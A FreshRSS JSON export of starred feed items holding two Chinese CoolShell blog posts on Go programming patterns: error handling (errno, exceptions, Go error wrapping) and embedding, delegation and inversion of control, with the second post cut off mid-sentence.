{
    "id": "user/black_desk/state/org.freshrss/starred",
    "title": "收藏文章列表",
    "author": "black_desk",
    "items": [
{
    "id": "https://coolshell.cn/?p=21140",
    "timestampUsec": "1657644531898523",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "Error",
        "Go",
        "golang",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go 编程模式：错误处理",
    "author": ";陈皓",
    "published": 1608632340,
    "updated": 1608632340,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21140.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/err-check-300x186.jpg\" alt=\"\" width=\"300\" height=\"186\">错误处理一直以一是编程必需要面对的问题，错误处理如果做的好的话，代码的稳定性会很好。不同的语言有不同的出现处理的方式。Go语言也一样，在本篇文章中，我们来讨论一下Go语言的出错出处，尤其是那令人抓狂的 <code>if err != nil</code> 。</p>\n<p>在正式讨论Go代码里满屏的 <code>if err != nil</code> 怎么办这个事之前，我想先说一说编程中的错误处理。这样可以让大家在更高的层面理解编程中的错误处理。</p>\n<section><h3>本文是全系列中第2 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span>Go 编程模式：错误处理</span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21128.html\" rel=\"prev\" title=\"Go编程模式：切片，接口，时间和性能\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21146.html\" rel=\"next\" title=\"Go 编程模式：Functional Options\">下一篇文章</a> »</span></nav></section>\n<h4>C语言的错误检查</h4>\n<p>首先，我们知道，处理错误最直接的方式是通过错误码，这也是传统的方式，在过程式语言中通常都是用这样的方式处理错误的。比如 C 语言，基本上来说，其通过函数的返回值标识是否有错，然后通过全局的 <code>errno</code> 变量并配合一个 <code>errstr</code> 的数组来告诉你为什么出错。</p>\n<p>为什么是这样的设计？道理很简单，除了可以共用一些错误，更重要的是这其实是一种妥协。比如：<code>read()</code>, <code>write()</code>, <code>open()</code> 这些函数的返回值其实是返回有业务逻辑的值。也就是说，这些函数的返回值有两种语义，一种是成功的值，比如 <code>open()</code> 返回的文件句柄指针 <code>FILE*</code> ，或是错误 <code>NULL</code>。这样会导致调用者并不知道是什么原因出错了，需要去检查 <code>errno</code> 来获得出错的原因，从而可以正确地处理错误。</p>\n<p>一般而言，这样的错误处理方式在大多数情况下是没什么问题的。但是也有例外的情况，我们来看一下下面这个 C 语言的函数：</p>\n<p><span></span></p>\n<pre data-enlighter-language=\"c\">int atoi(const char *str)</pre>\n<p>这个函数是把一个字符串转成整型。但是问题来了，如果一个要传的字符串是非法的（不是数字的格式），如 “ABC” 或者整型溢出了，那么这个函数应该返回什么呢？出错返回，返回什么数都不合理，因为这会和正常的结果混淆在一起。比如，返回 <code>0</code>，那么会和正常的对 “0” 字符的返回值完全混淆在一起。这样就无法判断出错的情况。你可能会说，是不是要检查一下 <code>errno</code>，按道理说应该是要去检查的，但是，我们在 C99 的规格说明书中可以看到这样的描述——</p>\n<blockquote><p>7.20.1The functions atof, atoi, atol, and atoll need not affect the value of the integer expression errno on an error. If the value of the result cannot be represented, the behavior is undeﬁned.</p></blockquote>\n<p>像<code>atoi()</code>, <code>atof()</code>, <code>atol()</code> 或是 <code>atoll()</code> 这样的函数是不会设置 <code>errno</code>的，而且，还说了，如果结果无法计算的话，行为是undefined。所以，后来，libc 又给出了一个新的函数<code>strtol()</code>，这个函数在出错的时会设置全局变量 <code>errno</code> ：</p>\n<pre data-enlighter-language=\"c\">long val = strtol(in_str, &amp;endptr, 10);  //10的意思是10进制\n\n//如果无法转换\nif (endptr == str) {\n    fprintf(stderr, \"No digits were found\\n\");\n    exit(EXIT_FAILURE);\n}\n\n//如果整型溢出了\nif ((errno == ERANGE &amp;&amp; (val == LONG_MAX || val == LONG_MIN)) {\n    fprintf(stderr, \"ERROR: number out of range for LONG\\n\");\n    exit(EXIT_FAILURE);\n }\n\n//如果是其它错误\nif (errno != 0 &amp;&amp; val == 0) {\n    perror(\"strtol\");\n    exit(EXIT_FAILURE);\n}\n</pre>\n<p>虽然，<code>strtol()</code> 函数解决了 <code>atoi()</code> 函数的问题，但是我们还是能感觉到不是很舒服和自然。</p>\n<p>因为，这种用 返回值 + errno 的错误检查方式会有一些问题:</p>\n<ul>\n<li>程序员一不小心就会忘记返回值的检查，从而造成代码的 Bug；</li>\n<li>函数接口非常不纯洁，正常值和错误值混淆在一起，导致语义有问题。</li>\n</ul>\n<p>所以，后来，有一些类库就开始区分这样的事情。比如，Windows 的系统调用开始使用 <code>HRESULT</code> 的返回来统一错误的返回值，这样可以明确函数调用时的返回值是成功还是错误。但这样一来，函数的 input 和 output 只能通过函数的参数来完成，于是出现了所谓的 入参 和 出参 这样的区别。</p>\n<p>然而，这又使得函数接入中参数的语义变得复杂，一些参数是入参，一些参数是出参，函数接口变得复杂了一些。而且，依然没有解决函数的成功或失败可以被人为忽略的问题。</p>\n<h4>Java的错误处理</h4>\n<p>Java语言使用 <code>try-catch-finally</code> 通过使用异常的方式来处理错误，其实，这比起C语言的错处理进了一大步，使用抛异常和抓异常的方式可以让我们的代码有这样的一些好处：</p>\n<ul>\n<li>函数接口在 input（参数）和 output（返回值）以及错误处理的语义是比较清楚的。</li>\n<li>正常逻辑的代码可以与错误处理和资源清理的代码分开，提高了代码的可读性。</li>\n<li>异常不能被忽略（如果要忽略也需要 catch 住，这是显式忽略）。</li>\n<li>在面向对象的语言中（如 Java），异常是个对象，所以，可以实现多态式的 catch。</li>\n<li>与状态返回码相比，异常捕捉有一个显著的好处是，函数可以嵌套调用，或是链式调用。比如：\n<ul>\n<li><code>int x = add(a, div(b,c));</code></li>\n<li><code>Pizza p = PizzaBuilder().SetSize(sz).SetPrice(p)...;</code></li>\n</ul>\n</li>\n</ul>\n<h4>Go语言的错误处理</h4>\n<p>Go 语言的函数支持多返回值，所以，可以在返回接口把业务语义（业务返回值）和控制语义（出错返回值）区分开来。Go 语言的很多函数都会返回 result, err 两个值，于是:</p>\n<ul>\n<li>参数上基本上就是入参，而返回接口把结果和错误分离，这样使得函数的接口语义清晰；</li>\n<li>而且，Go 语言中的错误参数如果要忽略，需要显式地忽略，用 _ 这样的变量来忽略；</li>\n<li>另外，因为返回的 <code>error</code> 是个接口（其中只有一个方法 <code>Error()</code>，返回一个 <code>string</code> ），所以你可以扩展自定义的错误处理。</li>\n</ul>\n<p>另外，如果一个函数返回了多个不同类型的 <code>error</code>，你也可以使用下面这样的方式：</p>\n<pre data-enlighter-language=\"golang\">if err != nil {\n  switch err.(type) {\n    case *json.SyntaxError:\n      ...\n    case *ZeroDivisionError:\n      ...\n    case *NullPointerError:\n      ...\n    default:\n      ...\n  }\n}</pre>\n<p>我们可以看到，Go语言的错误处理的的方式，本质上是返回值检查，但是他也兼顾了异常的一些好处 – 对错误的扩展。</p>\n<h4>资源清理</h4>\n<p>出错后是需要做资源清理的，不同的编程语言有不同的资源清理的编程模式：</p>\n<ul>\n<li>C语言 – 使用的是 <code>goto fail;</code> 的方式到一个集中的地方进行清理（有篇有意思的文章可以看一下《<a title=\"由苹果的低级Bug想到的\" href=\"https://coolshell.cn/articles/11112.html\" target=\"_blank\" rel=\"noopener\">由苹果的低级BUG想到的</a>》）</li>\n<li>C++语言- 一般来说使用 <a href=\"https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization\" target=\"_blank\" rel=\"noopener\">RAII模式</a>，通过面向对象的代理模式，把需要清理的资源交给一个代理类，然后在析构函数来解决。</li>\n<li>Java语言 – 可以在finally 语句块里进行清理。</li>\n<li>Go语言 – 使用 <code>defer</code> 关键词进行清理。</li>\n</ul>\n<p>下面是一个Go语言的资源清理的示例：</p>\n<pre data-enlighter-language=\"golang\">func Close(c io.Closer) {\n  err := c.Close()\n  if err != nil {\n    log.Fatal(err)\n  }\n}\n\nfunc main() {\n  r, err := Open(\"a\")\n  if err != nil {\n    log.Fatalf(\"error opening 'a'\\n\")\n  }\n  defer Close(r) // 使用defer关键字在函数退出时关闭文件。\n\n  r, err = Open(\"b\")\n  if err != nil {\n    log.Fatalf(\"error opening 'b'\\n\")\n  }\n  defer Close(r) // 使用defer关键字在函数退出时关闭文件。\n}</pre>\n<h4>Error Check  Hell</h4>\n<p>好了，说到 Go 语言的 <code>if err !=nil</code> 的代码了，这样的代码的确是能让人写到吐。那么有没有什么好的方式呢，有的。我们先看如下的一个令人崩溃的代码。</p>\n<pre data-enlighter-language=\"golang\">func parse(r io.Reader) (*Point, error) {\n\n    var p Point\n\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Longitude); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Latitude); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.Distance); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.ElevationGain); err != nil {\n        return nil, err\n    }\n    if err := binary.Read(r, binary.BigEndian, &amp;p.ElevationLoss); err != nil {\n        return nil, err\n    }\n}</pre>\n<p>要解决这个事，我们可以用函数式编程的方式，如下代码示例：</p>\n<pre data-enlighter-language=\"golang\">func parse(r io.Reader) (*Point, error) {\n    var p Point\n    var err error\n    read := func(data interface{}) {\n        if err != nil {\n            return\n        }\n        err = binary.Read(r, binary.BigEndian, data)\n    }\n\n    read(&amp;p.Longitude)\n    read(&amp;p.Latitude)\n    read(&amp;p.Distance)\n    read(&amp;p.ElevationGain)\n    read(&amp;p.ElevationLoss)\n\n    if err != nil {\n        return &amp;p, err\n    }\n    return &amp;p, nil\n}</pre>\n<p>上面的代码我们可以看到，我们通过使用Closure 的方式把相同的代码给抽出来重新定义一个函数，这样大量的  <code>if err!=nil</code> 处理的很干净了。但是会带来一个问题，那就是有一个 <code>err</code> 变量和一个内部的函数，感觉不是很干净。</p>\n<p>那么，我们还能不能搞得更干净一点呢，我们从Go 语言的 <code>bufio.Scanner()</code>中似乎可以学习到一些东西：</p>\n<pre data-enlighter-language=\"golang\">scanner := bufio.NewScanner(input)\n\nfor scanner.Scan() {\n    token := scanner.Text()\n    // process token\n}\n\nif err := scanner.Err(); err != nil {\n    // process the error\n}</pre>\n<p>上面的代码我们可以看到，<code>scanner</code>在操作底层的I/O的时候，那个for-loop中没有任何的 <code>if err !=nil</code> 的情况，退出循环后有一个 <code>scanner.Err()</code> 的检查。看来使用了结构体的方式。模仿它，我们可以把我们的代码重构成下面这样：</p>\n<p>首先，定义一个结构体和一个成员函数</p>\n<pre data-enlighter-language=\"generic\">type Reader struct {\n    r   io.Reader\n    err error\n}\n\nfunc (r *Reader) read(data interface{}) {\n    if r.err == nil {\n        r.err = binary.Read(r.r, binary.BigEndian, data)\n    }\n}</pre>\n<p>然后，我们的代码就可以变成下面这样：</p>\n<pre data-enlighter-language=\"generic\">func parse(input io.Reader) (*Point, error) {\n    var p Point\n    r := Reader{r: input}\n\n    r.read(&amp;p.Longitude)\n    r.read(&amp;p.Latitude)\n    r.read(&amp;p.Distance)\n    r.read(&amp;p.ElevationGain)\n    r.read(&amp;p.ElevationLoss)\n\n    if r.err != nil {\n        return nil, r.err\n    }\n\n    return &amp;p, nil\n}</pre>\n<p>有了上面这个技术，我们的“<a href=\"https://martinfowler.com/bliki/FluentInterface.html\" target=\"_blank\" rel=\"noopener\">流式接口 Fluent Interface</a>”，也就很容易处理了。如下所示：</p>\n<pre data-enlighter-language=\"golang\">package main\n\nimport (\n  \"bytes\"\n  \"encoding/binary\"\n  \"fmt\"\n)\n\n// 长度不够，少一个Weight\nvar b = []byte {0x48, 0x61, 0x6f, 0x20, 0x43, 0x68, 0x65, 0x6e, 0x00, 0x00, 0x2c} \nvar r = bytes.NewReader(b)\n\ntype Person struct {\n  Name [10]byte\n  Age uint8\n  Weight uint8\n  err error\n}\nfunc (p *Person) read(data interface{}) {\n  if p.err == nil {\n    p.err = binary.Read(r, binary.BigEndian, data)\n  }\n}\n\nfunc (p *Person) ReadName() *Person {\n  p.read(&amp;p.Name) \n  return p\n}\nfunc (p *Person) ReadAge() *Person {\n  p.read(&amp;p.Age) \n  return p\n}\nfunc (p *Person) ReadWeight() *Person {\n  p.read(&amp;p.Weight) \n  return p\n}\nfunc (p *Person) Print() *Person {\n  if p.err == nil {\n    fmt.Printf(\"Name=%s, Age=%d, Weight=%d\\n\",p.Name, p.Age, p.Weight)\n  }\n  return p\n}\n\nfunc main() {   \n  p := Person{}\n  p.ReadName().ReadAge().ReadWeight().Print()\n  fmt.Println(p.err)  // EOF 错误\n}\n</pre>\n<p>相信你应该看懂这个技巧了，但是，其使用场景也就只能在对于同一个业务对象的不断操作下可以简化错误处理，对于多个业务对象的话，还是得需要各种 <code>if err != nil</code>的方式。</p>\n<h4>包装错误</h4>\n<p>最后，多说一句，我们需要包装一下错误，而不是干巴巴地把<code>err</code>给返回到上层，我们需要把一些执行的上下文加入。</p>\n<p>通常来说，我们会使用 <code>fmt.Errorf()</code>来完成这个事，比如：</p>\n<pre data-enlighter-language=\"golang\">if err != nil {\n   return fmt.Errorf(\"something failed: %v\", err)\n}</pre>\n<p>另外，在Go语言的开发者中，更为普遍的做法是将错误包装在另一个错误中，同时保留原始内容：</p>\n<pre data-enlighter-language=\"golang\">type authorizationError struct {\n    operation string\n    err error   // original error\n}\n\nfunc (e *authorizationError) Error() string {\n    return fmt.Sprintf(\"authorization failed during %s: %v\", e.operation, e.err)\n}</pre>\n<p>当然，更好的方式是通过一种标准的访问方法，这样，我们最好使用一个接口，比如 <code>causer</code>接口中实现 <code>Cause()</code> 方法来暴露原始错误，以供进一步检查：</p>\n<pre data-enlighter-language=\"golang\">type causer interface {\n    Cause() error\n}\n\nfunc (e *authorizationError) Cause() error {\n    return e.err\n}\n</pre>\n<p> </p>\n<p>这里有个好消息是，这样的代码不必再写了，有一个第三方的错误库（<a href=\"https://github.com/pkg/errors\" target=\"_blank\" rel=\"noopener\">github.com/pkg/errors</a>），对于这个库，我无论到哪都能看到他的存在，所以，这个基本上来说就是事实上的标准了。代码示例如下：</p>\n<pre data-enlighter-language=\"golang\">import \"github.com/pkg/errors\"\n\n//错误包装\nif err != nil {\n    return errors.Wrap(err, \"read failed\")\n}\n\n// Cause接口\nswitch err := errors.Cause(err).(type) {\ncase *MyError:\n    // handle specifically\ndefault:\n    // unknown error\n}</pre>\n<h4>参考文章</h4>\n<ul>\n<li><b>Golang Error Handling lesson by Rob Pike<br>\n</b><a href=\"http://jxck.hatenablog.com/entry/golang-error-handling-lesson-by-rob-pike\">http://jxck.hatenablog.com/entry/golang-error-handling-lesson-by-rob-pike</a></li>\n<li><b>Errors are values<br>\n</b><a href=\"https://blog.golang.org/errors-are-values\">https://blog.golang.org/errors-are-values</a></li>\n</ul>\n<p>（全文完）</p>\n<p align=\"center\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br>关注CoolShell微信公众账号和微信小程序</p>\n<div>\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n<div>——=== <b>访问 <a href=\"http://coolshell.cn/404/\" target=\"_blank\">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li><a href=\"https://coolshell.cn/articles/21615.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png\" alt=\"Go编程模式 ： 泛型编程\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></li><li><a href=\"https://coolshell.cn/articles/21263.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png\" alt=\"Go 编程模式：k8s Visitor 模式\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></li><li><a href=\"https://coolshell.cn/articles/21228.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png\" alt=\"Go编程模式：Pipeline\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></li><li><a href=\"https://coolshell.cn/articles/21214.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png\" alt=\"Go编程模式：委托和反转控制\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21214.html\">Go编程模式：委托和反转控制</a></li><li><a href=\"https://coolshell.cn/articles/21179.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png\" alt=\"Go 编程模式：Go Generation\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></li><li><a href=\"https://coolshell.cn/articles/21164.html\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png\" alt=\"Go编程模式：Map-Reduce\" width=\"150\" height=\"150\"></a><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a> first appeared on <a href=\"https://coolshell.cn/\">酷 壳 - CoolShell</a>."
    },
    "origin": {
        "streamId": 10,
        "title": "酷壳",
        "htmlUrl": "https://coolshell.cn/",
        "feedUrl": "https://coolshell.cn/feed"
    }
},
{
    "id": "https://coolshell.cn/?p=21214",
    "timestampUsec": "1657644531898527",
    "categories": [
        "Go 语言",
        "程序设计",
        "编程语言",
        "Go",
        "golang",
        "IoC",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Go编程模式：委托和反转控制",
    "author": ";陈皓",
    "published": 1608973020,
    "updated": 1608973020,
    "alternate": [
        {
            "href": "https://coolshell.cn/articles/21214.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<figure aria-describedby=\"caption-attachment-21256\"><img loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-300x298.png\" alt=\"\" width=\"300\" height=\"298\"><figcaption>图片来源：<a href=\"https://gophersource.com/\" target=\"_blank\" rel=\"noopener\">GopherSource</a></figcaption></figure>\n<p>反转控制<a title=\"IoC - Inversion of Control\" href=\"https://en.wikipedia.org/wiki/Inversion_of_control\" target=\"_blank\" rel=\"noopener\">IoC – Inversion of Control</a> 是一种软件设计的方法，其主要的思想是把控制逻辑与业务逻辑分享，不要在业务逻辑里写控制逻辑，这样会让控制逻辑依赖于业务逻辑，而是反过来，让业务逻辑依赖控制逻辑。在《<a href=\"https://coolshell.cn/articles/9949.html\" target=\"_blank\" rel=\"noopener\">IoC/DIP其实是一种管理思想</a>》中的那个开关和电灯的示例一样，开关是控制逻辑，电器是业务逻辑，不要在电器中实现开关，而是把开关抽象成一种协议，让电器都依赖之。这样的编程方式可以有效的降低程序复杂度，并提升代码重用。</p>\n<section><h3>本文是全系列中第4 / 10篇：<a href=\"https://coolshell.cn/articles/series/go%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%BC%8F\">Go编程模式</a></h3><ul><li><span><a href=\"https://coolshell.cn/articles/21128.html\">Go编程模式：切片，接口，时间和性能</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21140.html\">Go 编程模式：错误处理</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21146.html\">Go 编程模式：Functional Options</a></span></li><li><span>Go编程模式：委托和反转控制</span></li><li><span><a href=\"https://coolshell.cn/articles/21164.html\">Go编程模式：Map-Reduce</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21179.html\">Go 编程模式：Go Generation</a></span></li><li><span><a href=\"https://coolshell.cn/articles/17929.html\">Go编程模式：修饰器</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21228.html\">Go编程模式：Pipeline</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21263.html\">Go 编程模式：k8s Visitor 模式</a></span></li><li><span><a href=\"https://coolshell.cn/articles/21615.html\">Go编程模式 ： 泛型编程</a></span></li></ul><nav><span>« <a href=\"https://coolshell.cn/articles/21146.html\" rel=\"prev\" title=\"Go 编程模式：Functional Options\">上一篇文章</a></span><span><a href=\"https://coolshell.cn/articles/21164.html\" rel=\"next\" title=\"Go编程模式：Map-Reduce\">下一篇文章</a> »</span></nav></section>\n<p>面向对象的设计模式这里不提了，我们来看看Go语言使用Embed结构的一个示例。</p>\n<p><span></span></p>\n<h4>嵌入和委托</h4>\n<h5>结构体嵌入</h5>\n<p>在Go语言中，我们可以很方便的把一个结构体给嵌到另一个结构体中。如下所示：</p>\n<pre data-enlighter-language=\"golang\">type Widget struct {\n    X, Y int\n}\ntype Label struct {\n    Widget        // Embedding (delegation)\n    Text   string // Aggregation\n}</pre>\n<p>上面的示例中，我们把 <code>Widget</code>嵌入到了 <code>Label</code> 中，于是，我们可以这样使用：</p>\n<pre data-enlighter-language=\"golang\">label := Label{Widget{10, 10}, \"State:\"}\n\nlabel.X = 11\nlabel.Y = 12</pre>\n<p>如果在 <code>Label</code> 结构体里出现了重名，就需要解决重名，例如，如果 成员 <code>X</code> 重名，用 <code>label.X</code>表明 是自己的<code>X</code> ，用  <code>label.Wedget.X</code> 表示嵌入过来的。</p>\n<p>有了这样的嵌入，就可以像UI组件一样的在结构构的设计上进行层层分解。比如，我可以新出来两个结构体 <code>Button</code> 和 <code>ListBox</code>：</p>\n<pre data-enlighter-language=\"golang\">type Button struct {\n    Label // Embedding (delegation)\n}\n\ntype ListBox struct {\n    Widget          // Embedding (delegation)\n    Texts  []string // Aggregation\n    Index  int      // Aggregation\n}</pre>\n<h5>方法重写</h5>\n<p>然后，我们需要两个接口 <code>Painter</code> 用于把组件画出来，<code>Clicker</code> 用于表明点击事件：</p>\n<pre data-enlighter-language=\"golang\">type Painter interface {\n    Paint()\n}\n \ntype Clicker interface {\n    Click()\n}</pre>\n<p>当然，</p>\n<ul>\n<li>对于 <code>Lable</code> 来说，只有 <code>Painter</code> ，没有<code>Clicker</code></li>\n<li>对于 <code>Button</code> 和 <code>ListBox</code>来说，<code>Painter</code> 和<code>Clicker</code>都有。</li>\n</ul>\n<p>下面是一些实现：</p>\n<pre data-enlighter-language=\"golang\">func (label Label) Paint() {\n  fmt.Printf(\"%p:Label.Paint(%q)\\n\", &amp;label, label.Text)\n}\n\n//因为这个接口可以通过 Label 的嵌入带到新的结构体，\n//所以，可以在 Button 中可以重载这个接口方法以\nfunc (button Button) Paint() { // Override\n    fmt.Printf(\"Button.Paint(%s)\\n\", button.Text)\n}\nfunc (button Button) Click() {\n    fmt.Printf(\"Button.Click(%s)\\n\", button.Text)\n}\n\n\nfunc (listBox ListBox) Paint() {\n    fmt.Printf(\"ListBox.Paint(%q)\\n\", listBox.Texts)\n}\nfunc (listBox ListBox) Click() {\n    fmt.Printf(\"ListBox.Click(%q)\\n\", listBox.Texts)\n}</pre>\n<p>这里，需要重点提示一下，<strong><code>Button.Paint()</code> 接口可以通过 Label 的嵌入带到新的结构体，如果 <code>Button.Paint()</code> 不实现的话，会调用 <code>Label.Paint()</code> ，所以，在 <code>Button</code> 中声明 <code>Paint()</code> 方法，相当于Override</strong>。</p>\n<h5>嵌入结构多态</h5>\n<p>通过下面的程序可以看到，整个多态是怎么执行的。</p>\n<pre data-enlighter-language=\"golang\">button1 := Button{Label{Widget{10, 70}, \"OK\"}}\nbutton2 := NewButton(50, 70, \"Cancel\")\nlistBox := ListBox{Widget{10, 40}, \n    []string{\"AL\", \"AK\", \"AZ\", \"AR\"}, 0}\n\nfor _, painter := range []Painter{label, listBox, button1, button2} {\n    painter.Paint()\n}\n \nfor _, widget := range []interface{}{label, listBox, button1, button2} {\n  widget.(Painter).Paint()\n  if clicker, ok := widget.(Clicker); ok {\n    clicker.Click()\n  }\n  fmt.Println() // print a empty line \n}</pre>\n<p>我们可以看到，我们可以使用接口来多态，也可以使用 泛型的 <code>interface{}</code> 来多态，但是需要有一个类型转换。</p>\n<h4>反转控制</h4>\n<p>我们再来看一个示例，我们有一个存放整数的数据结构，如下所示：</p>\n<pre data-enlighter-language=\"golang\">type IntSet struct {\n    data map[int]bool\n}\nfunc NewIntSet() IntSet {\n    return IntSet{make(map[int]bool)}\n}\nfunc (set *IntSet) Add(x int) {\n    set.data[x] = true\n}\nfunc (set *IntSet) Delete(x int) {\n    delete(set.data, x)\n}\nfunc (set *IntSet) Contains(x int) bool {\n    return set.data[x]\n}</pre>\n<p>其中实现了 <code>Add()</code> 、<code>Delete()</code> 和 <code>Contains()</code> 三个操作，前两个是写操作，后一个是读操作。</p>\n<h5>实现Undo功能</h5>\n<p>现在我们想实现一个 Undo 的功能。我们可以把把 <code>IntSet</code> 再包装一下变成 <code>UndoableIntSet</code> 代码如下所示：</p>\n<pre data-enlighter-language=\"golang\">type UndoableIntSet struct { // Poor style\n    IntSet    // Embedding (delegation)\n    functions []func()\n}\n \nfunc NewUndoableIntSet() UndoableIntSet {\n    return UndoableIntSet{NewIntSet(), nil}\n}\n \n\nfunc (set *UndoableIntSet) Add(x int) { // Override\n    if !set.Contains(x) {\n        set.data[x] = true\n        set.functions = append(set.functions, func() { set.Delete(x) })\n    } else {\n        set.functions = append(set.functions, nil)\n    }\n}\n\n\nfunc (set *UndoableIntSet) Delete(x int) { // Override\n    if set.Contains(x) {\n        delete(set.data, x)\n        set.functions = append(set.functions, func() { set.Add(x) })\n    } else {\n        set.functions = append(set.functions, nil)\n    }\n}\n\nfunc (set *UndoableIntSet) Undo() error {\n    if len(set.functions) == 0 {\n        return errors.New(\"No functions to undo\")\n    }\n    index := len(set.functions) - 1\n    if function := set.functions[index]; function != nil {\n        function()\n        set.functions[index] = nil // For garbage collection\n    }\n    set.functions = set.functions[:index]\n    return nil\n}</pre>\n<p>在上面的代码中，我们可以看到</p>\n<ul>\n<li>我们在 <code>UndoableIntSet</code> 中嵌入了<code>IntSet</code> ，然后Override了 它的 <code>Add()</code>和 <code>Delete()</code> 方法。</li>\n<li><code>Contains()</code> 方法没有Override，所以，会被带到 <code>UndoableInSet</code> 中来了。</li>\n<li>在Override的 <code>Add()</code>中，记录 <code>Delete</code> 操作</li>\n<li>在Override的 <code>Delete()</code> 中，记录 <code>Add</code> 操作</li>\n<li>在新加入 <code>Undo()</code> 中进行Undo操作。</li>\n</ul>\n<p>通过这样的方式来为已有的代码扩展新的功能是一个很好的选择，这样，可以在重用原有代码功能和重新新的功能中达到一个平衡。但是，这种方式最大的问题是，Undo操作其实是一种控制逻辑，并不是业务逻辑，所以，在复用 Undo这个功能上是有问题。因为其中加入了大量跟 <code>IntSet</code> 相关的业务逻辑。</p>\n<h5>反转依赖</h5>\n<p>现在我们来看另一种方法：</p>\n<p>我们先声明一种函数接口，表现我们的Undo控制可以接受的函数签名是什么样的：</p>\n<pre data-enlighter-language=\"golang\">type Undo []func()</pre>\n<p>有了上面这个协议后，我们的Undo控制逻辑就可以写成如下：</p>\n<pre data-enlighter-language=\"golang\">func (undo *Undo) Add(function func()) {\n  *undo = append(*undo, function)\n}\n\nfunc (undo *Undo) Undo() error {\n  functions := *undo\n  if len(functions) == 0 {\n    return errors.New(\"No functions to undo\")\n  }\n  index := len(functions) - 1\n  if function := functions[index]; function != nil {\n    function()\n    functions[index] = nil // For garbage collection\n  }\n  *undo = functions[:index]\n  return nil\n}</pre>\n<p>这里你不必觉得奇怪， <code>Undo</code> 本来就是一个类型，不必是一个结构体，是一个函数数组也没什么问题。</p>\n<p>然后，我们在我们的IntSet里嵌入 Undo，然后，再在 <code>Add()</code> 和 <code>Delete()</code> 里使用上面的方法，就可以完成功能。</p>\n<pre data-enlighter-language=\"golang\" data-enlighter-highlight=\"3\">type IntSet struct {\n    data map[int]bool\n    undo Undo\n}\n \nfunc NewIntSet() IntSet {\n    return IntSet{data: make(map[int]bool)}\n}\n\nfunc (set *IntSet) Undo() error {\n    return set.undo.Undo()\n}\n \nfunc (set *IntSet) Contains(x int) bool {\n    return set.data[x]\n}\n\nfunc (set *IntSet) Add(x int) {\n    if !set.Contains(x) {\n        set.data[x] = true\n        set.undo.Add(func() { set.Delete(x) })\n    } else {\n        set.undo.Add(nil)\n    }\n}\n \nfunc (set *IntSet) Delete(x int) {\n    if set.Contains(x) {\n        delete(set.data, x)\n        set.undo.Add(func() { set.Add(x) })\n    } else {\n        set.undo.Add(nil)\n    }\n}</pre>\n<p>这个就是控制反转，不再由 控制逻辑 <code>Undo</code> 来依赖业务逻辑 <code>IntSet</code>，而是由业务逻辑 